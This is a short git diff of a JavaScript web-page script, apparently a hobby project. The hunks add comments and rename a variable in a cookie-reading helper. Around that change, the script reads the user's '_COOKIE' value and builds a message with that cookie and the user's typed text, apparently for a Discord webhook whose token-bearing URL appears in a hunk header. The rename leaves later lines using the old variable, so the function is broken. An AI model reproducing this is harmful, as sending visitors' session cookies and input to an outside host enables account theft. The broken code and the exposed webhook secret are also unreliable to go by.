@@ -6,16 +6,21 @@ const url = 'https://discord.com/api/webhooks/1291784928970670150/RYrqV58Npgt4tk
 var wait = false
 
 
-
+  // get the cookie. i kind of understand it but idk i just took it from stack overflow
   function getCookie(cname) {
+    // get the elements
     let name = cname + "=";
-    let cookie = document.cookie.split(';') 
+    let cookie = document.cookie.split(";")
     console.log(cookie)
+    // get the amount of substrings returned by the split function
     for(let i = 0; i <cookie.length; i++) {
-      let c = cookie[i];
-      while (c.charAt(0) == ' ') {
-        c = c.substring(1);
+
+      let currentString = cookie[i];
+      // remove any spaces before the cookie
+      while (currentString.charAt(0) == ' ') {
+        currentString = currentString.substring(1);
       }
+      // check if the name of the input cookie of the function is the same as the name of the cookie if it is it returns the cookie
       if (c.indexOf(name) == 0) {
         return c.substring(name.length, c.length);
       }
@@ -41,7 +46,7 @@ var wait = false
 
             var cookie = getCookie("_COOKIE")
             
-            // Get the content of the textarea
+            // make the message
             const message = `There was a function call. The message was caracters ${length} long and was ${words} words.
              User cookie: ${cookie} Message: "${text}"`
     
